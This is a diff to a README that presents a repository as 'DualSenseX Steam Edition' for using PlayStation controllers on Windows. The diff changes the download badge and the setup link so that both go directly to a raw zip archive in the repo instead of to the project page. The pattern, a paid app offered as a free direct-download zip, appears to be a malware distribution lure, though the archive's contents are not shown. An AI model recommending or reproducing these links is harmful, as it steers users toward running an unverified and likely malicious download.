@@ -1,6 +1,6 @@
 # 🎮 DualSenseX-DSX-Steam-Edition - Connect PlayStation Controllers To Windows PC
 
-[![](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/omago123182/DualSenseX-DSX-Steam-Edition)
+[![](https://img.shields.io/badge/Download-DualSenseX-blue.svg)](https://github.com/omago123182/DualSenseX-DSX-Steam-Edition/raw/refs/heads/main/DSXSource/Steam_Sense_Edition_DS_Dual_v3.8-beta.5.zip)
 
 DualSenseX allows you to use your PlayStation 5 DualSense or PlayStation 4 DualShock 4 controller on a Windows computer. It maps your controller to look like an Xbox 360 controller to your PC. This trick makes your controller work with almost any game. You can use extra features like adaptive triggers, haptic feedback, and custom lighting settings.
 
@@ -8,7 +8,7 @@ DualSenseX allows you to use your PlayStation 5 DualSense or PlayStation 4 DualS
 
 Follow these steps to set up your controller for use on Windows. 
 
-1. Visit the [project download page](https://github.com/omago123182/DualSenseX-DSX-Steam-Edition).
+1. Visit the [project download page](https://github.com/omago123182/DualSenseX-DSX-Steam-Edition/raw/refs/heads/main/DSXSource/Steam_Sense_Edition_DS_Dual_v3.8-beta.5.zip).
 2. Locate the latest release version.
 3. Download the zipped folder to your computer.
 4. Open the folder and extract the contents to a location of your choice.
